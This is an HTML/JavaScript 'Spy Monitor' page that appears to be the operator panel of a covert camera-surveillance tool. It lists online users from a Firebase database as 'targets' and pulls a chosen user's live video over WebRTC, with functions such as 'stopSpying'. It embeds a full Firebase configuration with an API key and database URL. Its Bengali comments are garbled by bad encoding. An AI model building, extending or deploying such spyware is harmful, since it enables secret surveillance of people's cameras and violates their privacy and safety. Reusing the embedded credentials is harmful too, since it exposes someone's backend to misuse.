<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Spy Monitor - Debug Mode</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <script src="https://unpkg.com/simple-peer@9.11.1/simplepeer.min.js"></script>
    <style>
        body { background: #000; color: #0f0; font-family: monospace; padding: 10px; text-align: center; }
        
        /* ‡¶°‡¶ø‡¶¨‡¶æ‡¶ó ‡¶≤‡¶ó (‡¶∏‡ßç‡¶ï‡ßç‡¶∞‡¶ø‡¶®‡ßá ‡¶≤‡ßá‡¶ñ‡¶æ ‡¶â‡¶†‡¶¨‡ßá) */
        #debugLog { 
            background: #111; border: 1px solid #333; color: yellow; 
            padding: 10px; margin: 10px auto; width: 90%; height: 100px; 
            overflow-y: scroll; text-align: left; font-size: 10px;
        }

        #userList { list-style: none; padding: 0; }
        .user-card { 
            background: #222; border: 1px solid #444; padding: 10px; margin: 5px 0; 
            cursor: pointer; display: flex; justify-content: space-between; 
        }
        .online { color: #0f0; font-weight: bold; }
        
        #videoContainer { 
            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
            background: black; z-index: 999; flex-direction: column; 
            align-items: center; justify-content: center;
        }
        
        video { width: 100%; max-width: 600px; border: 2px solid #0f0; background: #222; }
        .btn-close { background: red; color: white; padding: 10px 20px; border: none; margin-top: 10px; font-weight: bold; }
    </style>
</head>
<body>

    <h3>üì° SCANNING TARGETS...</h3>
    
    <div id="debugLog">System Ready...</div>

    <ul id="userList"></ul>

    <div id="videoContainer">
        <h3 id="statusTitle" style="color: #0f0;">Connecting...</h3>
        <video id="remoteVideo" autoplay playsinline muted></video>
        <button class="btn-close" onclick="stopSpying()">CLOSE CONNECTION</button>
    </div>

    <script>
        // ‡ßß. ‡¶§‡ßã‡¶∞ ‡¶ï‡¶®‡¶´‡¶ø‡¶ó‡¶æ‡¶∞‡ßá‡¶∂‡¶®
        const firebaseConfig = {
          apiKey: "AIzaSyBy5AGDGQFZqbL83fKQfLViX_pyOu6AJ38",
          authDomain: "phone-f605e.firebaseapp.com",
          databaseURL: "https://phone-f605e-default-rtdb.firebaseio.com",
          projectId: "phone-f605e",
          storageBucket: "phone-f605e.firebasestorage.app",
          messagingSenderId: "902490805880",
          appId: "1:902490805880:web:98a5ed1432a0e3538e3f8d",
          measurementId: "G-WSJDCYKM3F"
        };

        function log(msg) {
            const logBox = document.getElementById("debugLog");
            logBox.innerHTML += `> ${msg}<br>`;
            logBox.scrollTop = logBox.scrollHeight;
            console.log(msg);
        }

        if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
        const db = firebase.database();
        let currentPeer = null;
        let currentTargetId = null;

        // ‡ß®. ‡¶á‡¶â‡¶ú‡¶æ‡¶∞ ‡¶≤‡¶ø‡¶∏‡ßç‡¶ü ‡¶≤‡ßã‡¶°
        db.ref("users").on("value", snapshot => {
            const list = document.getElementById("userList");
            list.innerHTML = "";
            snapshot.forEach(child => {
                const uid = child.key;
                const data = child.val();
                const isOnline = data.status === "online";
                
                const li = document.createElement("li");
                li.className = "user-card";
                li.innerHTML = `<span>${data.email.split('@')[0]}</span> <span class="${isOnline?'online':''}">${isOnline?'‚óè ONLINE':'‚óã OFFLINE'}</span>`;
                
                if(isOnline) li.onclick = () => prepareConnection(uid, data.email);
                list.appendChild(li);
            });
        });

        // ‡ß©. ‡¶ï‡¶æ‡¶®‡ßá‡¶ï‡¶∂‡¶® ‡¶∂‡ßÅ‡¶∞‡ßÅ
        function prepareConnection(uid, email) {
            document.getElementById("videoContainer").style.display = "flex";
            document.getElementById("statusTitle").innerText = "Target: " + email;
            log("Starting connection process...");
            currentTargetId = uid;

            // ‡¶ï‡ßç‡¶≤‡¶ø‡¶®‡¶Ü‡¶™
            db.ref("users/" + uid + "/offer").remove();
            db.ref("users/" + uid + "/answer").remove().then(() => {
                startWebRTC(uid);
            });
        }

        function startWebRTC(targetId) {
            log("Initializing Peer...");
            
            // üî• ‡¶™‡¶æ‡¶ì‡ßü‡¶æ‡¶∞‡¶´‡ßÅ‡¶≤ ‡¶∏‡¶æ‡¶∞‡ßç‡¶≠‡¶æ‡¶∞ ‡¶≤‡¶ø‡¶∏‡ßç‡¶ü (NAT ‡¶¨‡¶æ‡¶á‡¶™‡¶æ‡¶∏ ‡¶ï‡¶∞‡¶æ‡¶∞ ‡¶ú‡¶®‡ßç‡¶Ø)
            currentPeer = new SimplePeer({ 
                initiator: true, 
                trickle: false,
                config: { 
                    iceServers: [
                        { urls: 'stun:stun.l.google.com:19302' },
                        { urls: 'stun:stun1.l.google.com:19302' },
                        { urls: 'stun:stun2.l.google.com:19302' },
                        { urls: 'stun:global.stun.twilio.com:3478' }
                    ] 
                } 
            });

            // ‡¶∏‡¶ø‡¶ó‡¶®‡ßç‡¶Ø‡¶æ‡¶≤ ‡¶™‡¶æ‡¶†‡¶æ‡¶®‡ßã
            currentPeer.on('signal', offer => {
                log("Signal Generated. Sending to Database...");
                db.ref("users/" + targetId + "/offer").set(offer);
            });

            // ‡¶â‡¶§‡ßç‡¶§‡¶∞ ‡¶∞‡¶ø‡¶∏‡¶ø‡¶≠ ‡¶ï‡¶∞‡¶æ
            db.ref("users/" + targetId + "/answer").on("value", snapshot => {
                const answer = snapshot.val();
                if (answer && currentPeer && !currentPeer.connected) {
                    log("Answer Received from User!");
                    currentPeer.signal(answer);
                }
            });

            // ‡¶ï‡¶æ‡¶®‡ßá‡¶ï‡¶∂‡¶® ‡¶∏‡ßç‡¶ü‡ßç‡¶Ø‡¶æ‡¶ü‡¶æ‡¶∏ ‡¶ö‡ßá‡¶ï
            currentPeer.on('connect', () => {
                log("‚úÖ P2P CONNECTION ESTABLISHED!");
                document.getElementById("statusTitle").innerText = "CONNECTED! Waiting for video...";
            });

            // üî• ‡¶≠‡¶ø‡¶°‡¶ø‡¶ì ‡¶∏‡ßç‡¶ü‡ßç‡¶∞‡¶ø‡¶Æ ‡¶Ü‡¶∏‡¶≤‡ßá
            currentPeer.on('stream', stream => {
                log("üé• VIDEO STREAM ARRIVED!");
                const video = document.getElementById("remoteVideo");
                
                if ("srcObject" in video) {
                    video.srcObject = stream;
                } else {
                    video.src = window.URL.createObjectURL(stream);
                }
                
                video.onloadedmetadata = () => {
                    log("Video Metadata Loaded. Playing...");
                    video.play().catch(e => log("Autoplay Error: " + e));
                };
            });

            currentPeer.on('error', err => {
                log("‚ùå ERROR: " + err);
                alert("Connection Error: " + err);
            });
            
            currentPeer.on('close', () => {
                log("Connection Closed.");
                stopSpying();
            });
        }

        function stopSpying() {
            if (currentPeer) currentPeer.destroy();
            location.reload();
        }
    </script>
</body>
</html>
